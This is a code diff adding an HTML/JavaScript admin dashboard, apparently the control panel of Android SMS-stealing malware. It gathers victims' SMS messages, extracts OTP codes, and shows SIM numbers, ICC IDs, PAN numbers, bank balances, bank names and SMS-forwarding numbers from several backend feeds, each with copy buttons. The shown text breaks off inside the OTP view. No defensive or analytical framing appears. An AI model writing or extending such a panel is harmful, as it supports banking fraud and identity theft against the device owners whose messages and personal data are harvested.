@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Alexa Admin X</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Fira+Code:wght@300;400;600&display=swap');
+body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#00e5ff;overflow:hidden;height:100dvh;user-select:text}
+
+/* Animated X Logo */
+.logo-anim {
+    width: 70px; height: 70px;
+    margin: 0 auto 14px; position: relative;
+    display: flex; align-items: center; justify-content: center;
+}
+.logo-anim .letter {
+    font-family:'Orbitron',sans-serif; font-size:44px; font-weight:900;
+    color:#00e5ff; text-shadow:0 0 30px rgba(0,229,255,.5),0 0 60px rgba(0,229,255,.2);
+    animation:pulseX 2s ease-in-out infinite; position:relative; z-index:2;
+}
+.logo-anim .ring {
+    position:absolute; width:100%; height:100%; border-radius:50%;
+    border:2px solid rgba(0,229,255,.25); animation:spinRing 3s linear infinite;
+}
+.logo-anim .ring:nth-child(2) {
+    width:85%; height:85%; border-color:rgba(0,229,255,.12);
+    border-top-color:transparent; animation-duration:2s; animation-direction:reverse;
+}
+.logo-anim .ring:nth-child(3) {
+    width:70%; height:70%; border-color:rgba(0,229,255,.08);
+    border-right-color:transparent; animation-duration:4s;
+}
+@keyframes pulseX {
+    0%,100%{transform:scale(1);text-shadow:0 0 30px rgba(0,229,255,.5),0 0 60px rgba(0,229,255,.2)}
+    50%{transform:scale(1.08);text-shadow:0 0 40px rgba(0,229,255,.7),0 0 80px rgba(0,229,255,.3),0 0 120px rgba(0,229,255,.15)}
+}
+@keyframes spinRing {
+    0%{transform:rotate(0deg)}
+    100%{transform:rotate(360deg)}
+}
+
+#bgVid{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:0;pointer-events:none}
+#bgOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.7);z-index:0;pointer-events:none}
+
+.scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
+.scr.act{display:flex}
+#logScr{justify-content:center;align-items:center}
+.lb{text-align:center;width:88%;max-width:360px;padding:30px 20px;border:1px solid #00e5ff55;border-radius:14px;background:linear-gradient(135deg,rgba(0,229,255,.03),rgba(0,0,0,.9));box-shadow:0 0 60px rgba(0,229,255,.05),inset 0 0 60px rgba(0,229,255,.02)}
+.lb h1{font-family:'Orbitron',sans-serif;font-size:5vw;color:#00e5ff;text-shadow:0 0 30px rgba(0,229,255,.3),0 0 80px rgba(0,229,255,.08)}@media(min-width:500px){.lb h1{font-size:22px}}
+.lb .s{color:#00e5ff77;font-size:9px;margin:4px 0 20px;letter-spacing:3px}
+.lb input{width:100%;padding:14px;background:#0d0d0d;border:1px solid #00e5ff33;border-radius:8px;color:#00e5ff;font-family:'Fira Code',monospace;font-size:15px;outline:none;margin-bottom:12px;text-align:center;letter-spacing:4px}
+.lb input:focus{border-color:#00e5ff;box-shadow:0 0 20px rgba(0,229,255,.15)}
+.lb button{width:100%;padding:14px;background:transparent;border:1px solid #00e5ff;border-radius:8px;color:#00e5ff;font-family:'Orbitron',sans-serif;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:3px;transition:.3s}
+.lb button:hover{background:#00e5ff;color:#000;box-shadow:0 0 40px rgba(0,229,255,.3)}
+.lb .er{color:#ff4466;font-size:12px;margin-top:10px}
+.top{background:linear-gradient(180deg,rgba(0,229,255,.02),transparent);padding:12px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #00e5ff11;z-index:2;min-height:52px;backdrop-filter:blur(12px)}
+.top .bck{font-size:20px;cursor:pointer;color:#00e5ff;background:none;border:1px solid #00e5ff33;border-radius:6px;padding:4px 10px;font-family:'Fira Code',monospace}
+.top .bck:hover{background:#00e5ff11}
+.top h2{flex:1;font-size:13px;font-family:'Orbitron',sans-serif;color:#00e5ff;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:2px}
+.top .bdg{font-size:8px;padding:4px 10px;border-radius:4px;border:1px solid #00e5ff44;color:#00e5ff;background:#00e5ff08;white-space:nowrap;flex-shrink:0;letter-spacing:1px}
+.cnt{flex:1;overflow-y:auto;padding:10px 12px;z-index:1;-webkit-overflow-scrolling:touch}
+.srch{display:flex;gap:8px;margin-bottom:10px}
+.srch input{flex:1;padding:10px 12px;background:#0d0d0d;border:1px solid #00e5ff22;border-radius:8px;color:#00e5ff;font-family:'Fira Code',monospace;font-size:12px;outline:none}
+.srch input:focus{border-color:#00e5ff55}
+.srch input::placeholder{color:#00e5ff44}
+.cd{background:linear-gradient(135deg,rgba(0,229,255,.02),rgba(0,0,0,.8));border:1px solid #00e5ff11;border-radius:10px;padding:14px;margin-bottom:10px;box-shadow:0 0 20px rgba(0,229,255,.02),inset 0 0 40px rgba(0,229,255,.01)}
+.cd h3{font-family:'Orbitron',sans-serif;font-size:10px;color:#00e5ff;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid #00e5ff11;font-weight:400;letter-spacing:3px;text-transform:uppercase}
+.dc{background:linear-gradient(135deg,rgba(0,229,255,.02),#0d0d0d);border:1px solid #00e5ff11;border-radius:8px;padding:12px;margin-bottom:6px;cursor:pointer;transition:.2s}
+.dc:active{background:#00e5ff08;border-color:#00e5ff44;transform:scale(.98)}
+.dc .tr{display:flex;justify-content:space-between;align-items:center;margin-bottom:2px}
+.dc .sno{font-size:8px;color:#00e5ff77;background:#00e5ff08;padding:2px 7px;border-radius:3px;font-weight:600;letter-spacing:1px;border:1px solid #00e5ff22}
+.dc .dn{font-size:13px;color:#00e5ffbb;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dc .di{font-size:10px;color:#00e5ff77;margin-bottom:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dc .m{display:flex;gap:12px;font-size:10px;color:#00e5ff66;flex-wrap:wrap;align-items:center}
+.dc .m sp{display:flex;align-items:center;gap:3px}
+.st{width:7px;height:7px;border-radius:50%;display:inline-block}
+.st.on{background:#00e5ff;box-shadow:0 0 10px #00e5ff,0 0 20px #00e5ff77;animation:pl 1.5s infinite}
+.st.off{background:#3355ff;box-shadow:0 0 6px #3355ff66}
+@keyframes pl{0%{box-shadow:0 0 8px #00e5ff}50%{box-shadow:0 0 20px #00e5ff,0 0 40px #00e5ff77}100%{box-shadow:0 0 8px #00e5ff}}
+.sg{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
+.sg .s{background:rgba(0,229,255,.02);border:1px solid #00e5ff11;border-radius:8px;padding:12px 8px;text-align:center}
+.sg .s .v{font-family:'Orbitron',sans-serif;font-size:22px;font-weight:700;color:#00e5ff;text-shadow:0 0 20px rgba(0,229,255,.2)}
+.sg .s .l{font-size:8px;color:#00e5ff77;margin-top:2px;letter-spacing:1px}
+.br{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:12px}
+.br .b{background:rgba(0,229,255,.02);border:1px solid #00e5ff11;border-radius:8px;padding:12px 4px;text-align:center;cursor:pointer;transition:.2s}
+.br .b:active{background:rgba(0,229,255,.08);border-color:#00e5ff55}
+.br .b .ic{font-size:18px;display:block;margin-bottom:3px}
+.br .b .l{font-size:7px;color:#00e5ff77;letter-spacing:1px}
+.oi{background:rgba(0,0,0,.4);border:1px solid #00e5ff11;border-radius:8px;padding:10px;margin-bottom:6px}
+.oi .h{display:flex;justify-content:space-between;font-size:9px;color:#00e5ff77;margin-bottom:4px;flex-wrap:wrap;gap:4px}
+.oi .oc{font-family:'Orbitron',sans-serif;font-size:18px;color:#00e5ff;text-shadow:0 0 15px rgba(0,229,255,.3);margin-bottom:2px;letter-spacing:6px}
+.oi .fr{font-size:10px;color:#00e5ff66;word-break:break-all;cursor:pointer}
+.oi .fr:active{color:#fff}
+.smi{display:flex;gap:10px;padding:8px 0;border-bottom:1px solid #00e5ff08;cursor:pointer}
+.smi:active{background:rgba(0,229,255,.03)}
+.smi .av{width:36px;height:36px;border-radius:50%;background:rgba(0,229,255,.08);border:1px solid #00e5ff22;display:flex;align-items:center;justify-content:center;font-size:13px;color:#00e5ff;flex-shrink:0}
+.smi .b{flex:1;min-width:0}
+.smi .n{font-size:11px;color:#00e5ffaa;font-weight:600}
+.smi .m{font-size:11px;color:#00e5ff77;margin:2px 0;word-break:break-all;cursor:pointer}
+.smi .m:active{color:#fff}
+.smi .t{font-size:9px;color:#00e5ff44}
+.ts{display:flex;gap:4px;margin-bottom:10px;overflow-x:auto;padding-bottom:4px}
+.ts .t{padding:6px 12px;background:transparent;border:1px solid #00e5ff22;border-radius:6px;color:#00e5ff77;font-family:'Fira Code',monospace;font-size:9px;cursor:pointer;white-space:nowrap;letter-spacing:1px;transition:.2s}
+.ts .t.act{background:#00e5ff;color:#000;border-color:#00e5ff;font-weight:600}
+.sip{display:flex;gap:8px;margin-bottom:8px}
+.sip input{flex:1;padding:10px;background:#0d0d0d;border:1px solid #00e5ff22;border-radius:6px;color:#00e5ff;font-family:'Fira Code',monospace;font-size:12px;outline:none}
+.sip input:focus{border-color:#00e5ff55}
+.sip input::placeholder{color:#00e5ff44}
+#toast{position:fixed;bottom:60px;left:50%;transform:translateX(-50%);background:rgba(0,229,255,.1);border:1px solid #00e5ff44;color:#00e5ff;padding:10px 24px;border-radius:8px;font-size:11px;z-index:99;opacity:0;transition:.4s;backdrop-filter:blur(12px);font-family:'Fira Code',monospace;letter-spacing:1px}
+.cp{cursor:pointer;border-bottom:1px dotted #00e5ff44}
+.cp:active{color:#fff}
+.hl{background:rgba(0,0,0,.3);border:1px solid #00e5ff11;border-radius:8px;padding:12px;font-size:10px;line-height:1.8;color:#00e5ff77;word-break:break-all}
+.hl span{color:#00e5ff}
+.hl .cp{color:#00e5ffbb}
+</style>
+</head>
+<body>
+
+<video id="bgVid" muted loop playsinline>
+  <source src="background.mp4" type="video/mp4">
+</video>
+<div id="bgOverlay"></div>
+<audio id="bgAudio" loop preload="auto">
+  <source src="background.mp3" type="audio/mpeg">
+</audio>
+
+<!-- Login Screen -->
+<div id="logScr" class="scr act">
+  <div class="lb">
+    <div class="logo-anim">
+      <div class="ring"></div>
+      <div class="ring"></div>
+      <div class="ring"></div>
+      <div class="letter">A</div>
+    </div>
+    <h1>⦗ALEXA⦘</h1>
+    <div class="s">║ ADMIN X PANEL ║</div>
+    <input type="password" id="loginPass" placeholder="█ ENTER PASSWORD" autocomplete="off">
+    <button onclick="doLogin()">⏎ UNLOCK</button>
+    <div id="loginErr" class="er"></div>
+  </div>
+</div>
+
+<!-- Main Screen -->
+<div id="mainScr" class="scr">
+  <div class="top">
+    <h2>⦗ALEXA ADMIN X⦘</h2>
+    <span class="bdg" id="muteBtn" onclick="toggleMute()" style="cursor:pointer">🔊</span>
+    <span class="bdg" id="onlineBdg" style="border-color:#00e5ff77;color:#00e5ff;background:#00e5ff08">⬤ 0</span>
+  </div>
+  <div class="cnt">
+    <div class="srch"><input id="srchInp" placeholder="█ Search device..."></div>
+    <div class="sg" id="dashStats"></div>
+    <div class="br" id="dashButtons"></div>
+    <div id="dashBody"></div>
+  </div>
+</div>
+
+<!-- Detail Screen -->
+<div id="detailScr" class="scr">
+  <div class="top"><button class="bck" onclick="closeDetail()">‹</button><h2 id="detailTitle">DETAIL</h2><span class="bdg" id="detailBadge"></span></div>
+  <div class="cnt">
+    <div id="detailInfo"></div>
+    <div class="ts" id="detailTabs"></div>
+    <div id="detailBody"></div>
+  </div>
+</div>
+
+<!-- All SMS Screen -->
+<div id="allSmsScr" class="scr">
+  <div class="top"><button class="bck" onclick="showScr('mainScr')">‹</button><h2>📥 ALL SMS</h2><span class="bdg" id="allSmsCnt">0</span></div>
+  <div class="cnt"><div id="allSmsContent"></div></div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+function copyT(t){
+  if(navigator.clipboard){navigator.clipboard.writeText(t).then(()=>showToast('✔ COPIED'))}else showToast(t)
+}
+function fmtTime(ts){
+  if(!ts)return'';
+  const n=Number(ts);
+  const d=new Date(n);
+  if(isNaN(d.getTime())){
+    try{d=new Date(ts.replace(/-/g,'/'))}catch(e){return String(ts).slice(0,16)}
+  }
+  return d.toLocaleString('en-IN',{day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit',hour12:false});
+}
+function fmtDate(str){
+  if(!str)return'';
+  if(str.includes('-'))return str.slice(0,16);
+  return fmtTime(str);
+}
+
+// === MEDIA ===
+function startMedia(){
+  const v=document.getElementById('bgVid'),a=document.getElementById('bgAudio');
+  v.play().catch(()=>{});a.play().catch(()=>{});
+}
+function toggleMute(){
+  const a=document.getElementById('bgAudio'),b=document.getElementById('muteBtn');
+  a.muted=!a.muted;b.textContent=a.muted?'🔇':'🔊';
+}
+
+// Data
+let devicesData={},smsData={},clientsData={},fwdData={},simData={};
+let pikaDevices={},pikaSms={},pikaLogin={};
+let biharInfo={},biharSms={},biharSim={},biharDidMap={};
+let sessionValid=false,searchQ='',curUserId='',showOnline=false;
+let allUserIds=[],deviceSource={},dataLoaded=false,pikaSmsKeys=new Set();
+
+function getDeviceIds(){return allUserIds}
+function isOnline(id){
+  if(deviceSource[id]==='p')return pikaSmsKeys.has(id);
+  if(deviceSource[id]==='b'){const d=biharInfo[id];return d&&d.status==='Online'}
+  const d=devicesData[id];return d&&d.Status==='Online'
+}
+function getDeviceBrand(id){
+  if(deviceSource[id]==='p'){const d=pikaDevices[id];return d?d.d_name||'?':''}
+  if(deviceSource[id]==='b'){const d=biharInfo[id];return d?d.Name||'?':''}
+  const d=devicesData[id];return d?d.Brand||'?':''
+}
+function getDeviceBattery(id){
+  if(deviceSource[id]==='p'){const d=pikaDevices[id];return d?d.battery||'?':''}
+  if(deviceSource[id]==='b'){const d=biharInfo[id];return d?d.Battery||'?':''}
+  const d=devicesData[id];return d?d.Battery||'?':''
+}
+function getUserSms(id){
+  const list=[];
+  if(deviceSource[id]==='p'){
+    const s=pikaSms[id];
+    if(s){Object.keys(s).forEach(k=>{const m=s[k];list.push({...m,key:k,userId:id})})}
+    return list.sort((a,b)=>((b.timestamp||0)-(a.timestamp||0)));
+  }
+  if(deviceSource[id]==='b'){
+    const did=biharDidMap[id];
+    const s=biharSms[did];
+    if(s){Object.keys(s).forEach(k=>{const m=s[k];list.push({...m,key:k,userId:id,body:m.msg,sender:m.ph,date:m.date})})}
+    return list.sort((a,b)=>((b.date||0)-(a.date||0)));
+  }
+  const src=smsData;
+  const s=src[id];
+  if(s){Object.keys(s).forEach(k=>{const m=s[k];list.push({...m,key:k,userId:id})})}
+  return list.sort((a,b)=>((b.timestampMillis||0)-(a.timestampMillis||0)));
+}
+function getAllSms(){
+  const list=[];
+  allUserIds.forEach(uid=>{getUserSms(uid).forEach(s=>list.push(s))});
+  return list.sort((a,b)=>{
+    const ta=Number(a.timestampMillis)||Number(a.timestamp)||(a.date?Number(a.date)||new Date(a.date).getTime():0);
+    const tb=Number(b.timestampMillis)||Number(b.timestamp)||(b.date?Number(b.date)||new Date(b.date).getTime():0);
+    return tb-ta;
+  });
+}
+function getClientBalance(uid){
+  const c=clientsData[uid];
+  return c?c.autoBalance||0:0;
+}
+function getClientBanks(uid){
+  const c=clientsData[uid];
+  return c?c.banks||'':'';
+}
+
+function getSimInfo(id){
+  if(deviceSource[id]==='p'){
+    const d=pikaDevices[id];if(!d)return null;
+    const info=[];
+    if(d.numberSim1&&d.numberSim1!=='Not Available')info.push(`SIM1:${d.numberSim1}`);
+    if(d.numberSim2&&d.numberSim2!=='Not Available'&&d.numberSim2!=='No SIM Found')info.push(`SIM2:${d.numberSim2}`);
+    return info.length?info.join(' | '):null;
+  }
+  if(deviceSource[id]==='b'){
+    const did=biharDidMap[id];
+    const s=biharSim[did];if(!s)return null;
+    const info=[];
+    if(s.sim1&&s.sim1!=='?')info.push(`SIM1:${s.sim1}`);
+    if(s.sim2&&s.sim2!=='?')info.push(`SIM2:${s.sim2}`);
+    return info.length?info.join(' | '):null;
+  }
+  const s=simData[id];if(!s)return null;
+  const info=[];
+  if(s.sim1Number&&s.sim1Number!='1')info.push(`SIM1:${s.sim1Number}`);
+  if(s.sim2Number)info.push(`SIM2:${s.sim2Number}`);
+  if(s.simStatus)info.push(s.simStatus);
+  return info.length?info.join(' | '):null;
+}
+
+// Load
+async function loadData(){
+  try{
+    const [devR,smsR,cliR,fwdR,simR,pikaDevR,pikaSmsR,pikaLoginR,biharInfoR,biharSmsR,biharSimR]=await Promise.all([
+      fetch('/api/fb/All_Users/Data/DeviceInfo').then(r=>r.json()),
+      fetch('/api/fb/All_Users/sms').then(r=>r.json()),
+      fetch('/api/fb/clients').then(r=>r.json()),
+      fetch('/api/fb/All_Users/SmsForwarding').then(r=>r.json()),
+      fetch('/api/fb/All_Users/simDetails').then(r=>r.json()),
+      fetch('/api/pika/user_data').then(r=>r.json()),
+      fetch('/api/pika/user_sms').then(r=>r.json()),
+      fetch('/api/pika/login').then(r=>r.json()),
+      fetch('/api/bihar/All_User/Info').then(r=>r.json()),
+      fetch('/api/bihar/All_User/Sms').then(r=>r.json()),
+      fetch('/api/bihar/All_User/SimINFO').then(r=>r.json())
+    ]);
+    devicesData=devR||{};smsData=smsR||{};clientsData=cliR||{};fwdData=fwdR||{};simData=simR||{};
+    pikaDevices=pikaDevR||{};pikaSms=pikaSmsR||{};pikaLogin=pikaLoginR||{};
+    pikaSmsKeys=new Set(Object.keys(pikaSms));
+    biharInfo=biharInfoR||{};biharSms=biharSmsR||{};biharSim=biharSimR||{};
+    // Remove non-object entries from pikachu data
+    for(const k in pikaDevices){if(typeof pikaDevices[k]!=='object')delete pikaDevices[k]}
+    // Build bihar did map
+    biharDidMap={};
+    for(const k in biharInfo){const d=biharInfo[k];if(d&&d.did)biharDidMap[k]=d.did}
+    // Merge user IDs
+    const xIds=Object.keys(devicesData);
+    const pIds=Object.keys(pikaDevices);
+    const bIds=Object.keys(biharInfo);
+    allUserIds=[...xIds];
+    const seen=new Set(xIds);
+    pIds.forEach(id=>{
+      if(!seen.has(id)){allUserIds.push(id);seen.add(id)}
+      deviceSource[id]='p';
+    });
+    bIds.forEach(id=>{
+      if(!seen.has(id)){allUserIds.push(id);seen.add(id)}
+      deviceSource[id]='b';
+    });
+    xIds.forEach(id=>{if(!deviceSource[id])deviceSource[id]='x'});
+    dataLoaded=true;
+    showToast(`✓ ${allUserIds.length} DEVICES`);
+    updateUI();
+  }catch(e){showToast('✖ RETRYING...');setTimeout(loadData,3000)}
+}
+
+// Data load + polling
+setTimeout(loadData,500);
+setInterval(loadData,30000); // Full reload every 30s
+
+// Fast SMS-key poll every 5s — pikachu status = ONLINE only if has SMS
+async function pollSmsKeys(){
+  if(!dataLoaded)return;
+  try{
+    const keys=await fetch('/api/pika/user_sms?shallow=true').then(r=>r.json());
+    const newSet=new Set(Object.keys(keys||{}));
+    let changed=false;
+    // Check for new SMS users
+    newSet.forEach(k=>{
+      if(!pikaSmsKeys.has(k)){changed=true;
+        fetch(`/api/pika/user_sms/${k}`).then(r=>r.json()).then(d=>{pikaSms[k]=d;updateUI()})}
+    });
+    // Check for removed
+    pikaSmsKeys.forEach(k=>{if(!newSet.has(k)){delete pikaSms[k];changed=true}});
+    pikaSmsKeys=newSet;
+    if(changed)updateUI();
+  }catch(e){}
+}
+setInterval(pollSmsKeys,2000);
+
+function updateUI(){
+  const scr=document.querySelector('.scr.act');
+  if(!scr)return;
+  const id=scr.id;
+  if(id==='mainScr')renderDashboard();
+  else if(id==='detailScr'&&curUserId)renderDetail();
+  else if(id==='allSmsScr')renderAllSms();
+}
+function showScr(id){
+  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
+  document.getElementById(id).classList.add('act');
+  updateUI();
+}
+window.closeDetail=()=>{curUserId='';showScr('mainScr')};
+
+function doLogin(){
+  const pass=document.getElementById('loginPass').value.trim();
+  if(!pass){document.getElementById('loginErr').textContent='█ ENTER PASSWORD';return}
+  document.getElementById('loginErr').textContent='█ VERIFYING...';
+  fetch('/api/verify_pass',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pass})})
+  .then(r=>r.json()).then(d=>{
+    if(d.ok){
+      localStorage.setItem('ax_sess',pass);
+      loginSuccess();
+    }else{
+      document.getElementById('loginErr').textContent='✖ INVALID PASSWORD';
+      document.getElementById('loginPass').value='';
+    }
+  }).catch(()=>{
+    document.getElementById('loginErr').textContent='✖ CONNECTION ERROR';
+    document.getElementById('loginPass').value='';
+  });
+}
+function loginSuccess(){
+  document.getElementById('logScr').classList.remove('act');
+  document.getElementById('mainScr').classList.add('act');
+  renderDashboard();startMedia();showToast('█ ACCESS GRANTED');
+}
+function checkSession(){
+  const saved=localStorage.getItem('ax_sess');
+  if(saved){
+    fetch('/api/verify_pass',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:saved})})
+    .then(r=>r.json()).then(d=>{if(d.ok)loginSuccess()}).catch(()=>{});
+  }
+}
+document.getElementById('loginPass').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin()});
+checkSession();
+
+function renderDashboard(){
+  const ids=getDeviceIds();
+  const smsList=getAllSms();
+  const otpCount=smsList.filter(s=>(s.body||'').toUpperCase().includes('OTP')).length;
+  const online=ids.filter(id=>isOnline(id)).length;
+  document.getElementById('onlineBdg').innerHTML='⬤ '+online;
+  document.getElementById('dashStats').innerHTML=`
+    <div class="s"><div class="v">${ids.length}</div><div class="l">DEVICES</div></div>
+    <div class="s"><div class="v">${online}</div><div class="l">ONLINE</div></div>
+    <div class="s"><div class="v">${smsList.length}</div><div class="l">SMS</div></div>
+    <div class="s"><div class="v">${otpCount}</div><div class="l">OTP</div></div>`;
+  document.getElementById('dashButtons').innerHTML=`
+    <div class="b" onclick="showOnline=false;showScr('mainScr')"><span class="ic">💻</span><span class="l">ALL DEV</span></div>
+    <div class="b" onclick="showOnline=true;showScr('mainScr')"><span class="ic" style="color:#00e5ff">⬤</span><span class="l">ONLINE</span></div>
+    <div class="b" onclick="showAllOtps()"><span class="ic">🔑</span><span class="l">OTP</span></div>
+    <div class="b" onclick="showScr('allSmsScr')"><span class="ic">📥</span><span class="l">ALL SMS</span></div>`;
+
+  let filtered=ids;
+  if(showOnline)filtered=ids.filter(id=>isOnline(id));
+  const q=searchQ.toLowerCase();
+  if(q)filtered=filtered.filter(d=>d.toLowerCase().includes(q)||getDeviceBrand(d).toLowerCase().includes(q)||(deviceSource[d]==='p'?(pikaDevices[d]&&(pikaDevices[d].phoneNumber||'').toLowerCase().includes(q)):false));
+  let html=`<div class="cd"><h3>💻 DEVICES (${filtered.length}/${ids.length})</h3>`;
+  filtered.forEach(d=>{
+    const sms=getUserSms(d),o=isOnline(d),brand=getDeviceBrand(d),bat=getDeviceBattery(d);
+    const ot=sms.filter(x=>(x.body||'').toUpperCase().includes('OTP')).length;
+    const bal=getClientBalance(d);
+    const sim=getSimInfo(d);
+    html+=`<div class="dc" onclick="openDevice('${d}')">
+      <div class="tr"><span class="sno">${d.slice(0,8)}</span><span class="dn">${brand}</span><span class="st ${o?'on':'off'}"></span></div>
+      <div class="di">🔋 ${bat} ${bal>0?`| ₹${bal.toLocaleString('en-IN',{maximumFractionDigits:2})}`:''}</div>
+      <div class="m"><sp>📨 ${sms.length}</sp><sp>🔑 ${ot}</sp><sp style="color:${o?'#00e5ff':'#3355ff'}">${o?'ONLINE':'OFFLINE'}</sp>${sim?`<sp style="color:#00e5ff88;font-size:8px">${sim}</sp>`:''}</div>
+    </div>`;
+  });
+  html+=`${!filtered.length?'<div style="padding:30px;text-align:center;color:#00e5ff44;font-size:12px">'+(q?'NO MATCH':'NO DEVICES')+'</div>':''}</div>`;
+  document.getElementById('dashBody').innerHTML=html;
+}
+document.getElementById('srchInp').addEventListener('input',function(){searchQ=this.value;renderDashboard()});
+
+function openDevice(userId){
+  curUserId=userId;renderDetail();
+  document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
+  document.getElementById('detailScr').classList.add('act');
+}
+let dtTab='info';
+function switchTab(tab){dtTab=tab;renderDetail();}
+
+function renderDetail(){
+  const uid=curUserId;
+  const src=deviceSource[uid];
+  const d=src==='p'?pikaDevices[uid]||{}:src==='b'?biharInfo[uid]||{}:devicesData[uid]||{};
+  const smsList=getUserSms(uid);
+  const otps=smsList.filter(s=>(s.body||'').toUpperCase().includes('OTP'));
+  const ol=isOnline(uid),brand=getDeviceBrand(uid),bat=getDeviceBattery(uid);
+  const bal=getClientBalance(uid),banks=getClientBanks(uid);
+  const fwd=fwdData[uid]||{};
+  document.getElementById('detailTitle').textContent=brand+' - '+uid.slice(0,10);
+  document.getElementById('detailBadge').textContent=ol?'⬤ ONLINE':'○ OFFLINE';
+  document.getElementById('detailBadge').style.color=ol?'#00e5ff':'#3355ff';
+  document.getElementById('detailBadge').style.borderColor=ol?'#00e5ff77':'#3355ff77';
+  let infoHtml=`<div class="cd"><h3>💻 ${brand}</h3><div class="hl">`;
+  infoHtml+=`<div>ID  : <span class="cp" onclick="copyT('${uid}')">${uid} 📋</span></div>`;
+  infoHtml+=`<div>BAT : <span class="cp" onclick="copyT('${bat}')">${bat}% 📋</span></div>`;
+  infoHtml+=`<div>STAT: <span style="color:${ol?'#00e5ff':'#3355ff'}">${ol?'ONLINE':'OFFLINE'}</span></div>`;
+  if(src==='p'){
+    const login=pikaLogin[uid]||{};
+    if(d.phoneNumber)infoHtml+=`<div>PH# : ${d.phoneNumber}</div>`;
+    if(login.name)infoHtml+=`<div>NAME: ${login.name}</div>`;
+    if(login.number)infoHtml+=`<div>NUM : <span class="cp" onclick="copyT('${login.number}')">${login.number} 📋</span></div>`;
+    if(login.pan)infoHtml+=`<div>PAN : <span class="cp" onclick="copyT('${login.pan}')">${login.pan} 📋</span></div>`;
+    if(d.iccIdSim1)infoHtml+=`<div>ICC1: <span class="cp" onclick="copyT('${d.iccIdSim1}')">${d.iccIdSim1} 📋</span></div>`;
+    if(d.iccIdSim2&&d.iccIdSim2!=='No Data')infoHtml+=`<div>ICC2: <span class="cp" onclick="copyT('${d.iccIdSim2}')">${d.iccIdSim2} 📋</span></div>`;
+    if(d.numberSim1&&d.numberSim1!=='Not Available')infoHtml+=`<div>S1# : <span class="cp" onclick="copyT('${d.numberSim1}')">${d.numberSim1} 📋</span>${d.nameSim1?` ${d.nameSim1}`:''}</div>`;
+    if(d.numberSim2&&d.numberSim2!=='Not Available'&&d.numberSim2!=='No SIM Found')infoHtml+=`<div>S2# : <span class="cp" onclick="copyT('${d.numberSim2}')">${d.numberSim2} 📋</span>${d.nameSim2?` ${d.nameSim2}`:''}</div>`;
+    if(d.ussd_code)infoHtml+=`<div>USSD: ${d.ussd_code}</div>`;
+    if(d.ussd_response)infoHtml+=`<div>RSP : ${d.ussd_response.slice(0,100)}</div>`;
+    if(d.installTime)infoHtml+=`<div>INST: ${d.installTime}</div>`;
+  }else if(src==='b'){
+    const did=biharDidMap[uid]||'';
+    if(d.status)infoHtml+=`<div>STAT: ${d.status}</div>`;
+    if(did)infoHtml+=`<div>DID : ${did}</div>`;
+    const sim=biharSim[did]||{};
+    if(sim.sim1)infoHtml+=`<div>S1# : <span class="cp" onclick="copyT('${sim.sim1}')">${sim.sim1} 📋</span></div>`;
+    if(sim.sim2)infoHtml+=`<div>S2# : <span class="cp" onclick="copyT('${sim.sim2}')">${sim.sim2} 📋</span></div>`;
+  }else{
+    if(bal>0)infoHtml+=`<div>BAL : <span class="cp" onclick="copyT('${bal}')">₹${bal.toLocaleString('en-IN',{maximumFractionDigits:2})} 📋</span></div>`;
+    if(banks)infoHtml+=`<div>BANKS: <span class="cp" onclick="copyT('${banks}')">${banks} 📋</span></div>`;
+    if(fwd.toNumber)infoHtml+=`<div>FWD : <span class="cp" onclick="copyT('${fwd.toNumber}')">${fwd.toNumber} 📋</span> SIM${fwd.slot||'?'}</div>`;
+    const sim=simData[uid]||{};
+    if(sim.sim1Number&&sim.sim1Number!='1')infoHtml+=`<div>S1# : <span class="cp" onclick="copyT('${sim.sim1Number}')">${sim.sim1Number} 📋</span> ${sim.sim1Provider?`<span style="font-size:8px">(${sim.sim1Provider})</span>`:''}</div>`;
+    if(sim.sim2Number)infoHtml+=`<div>S2# : <span class="cp" onclick="copyT('${sim.sim2Number}')">${sim.sim2Number} 📋</span> ${sim.sim2Provider?`<span style="font-size:8px">(${sim.sim2Provider})</span>`:''}</div>`;
+    if(sim.simStatus)infoHtml+=`<div>SIM : ${sim.simStatus}</div>`;
+  }
+  infoHtml+=`<div>SMS : ${smsList.length}</div>`;
+  infoHtml+=`</div></div>`;
+  document.getElementById('detailInfo').innerHTML=infoHtml;
+  document.getElementById('detailTabs').innerHTML=`
+    <div class="t ${dtTab==='otp'?'act':''}" onclick="switchTab('otp')">🔑 OTP</div>
+    <div class="t ${dtTab==='sms'?'act':''}" onclick="switchTab('sms')">📥 SMS</div>`;
+  document.getElementById('detailBody').innerHTML='';
+  if(dtTab==='otp'){
+    document.getElementById('detailBody').innerHTML=`<div class="cd"><h3>🔑 OTPs (${otps.length})</h3>
+      ${otps.length?otps.map(s=>{
+        const body=s.body||'';
+        const ts=s.receivedDate||s.date||s.timestamp||'';
+        return `<div class="oi"><div class="h"><span>${getDeviceBrand(uid)||uid.slice(0,8)}</span><span>${fmtDate(ts)}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,150)}</div></div>`
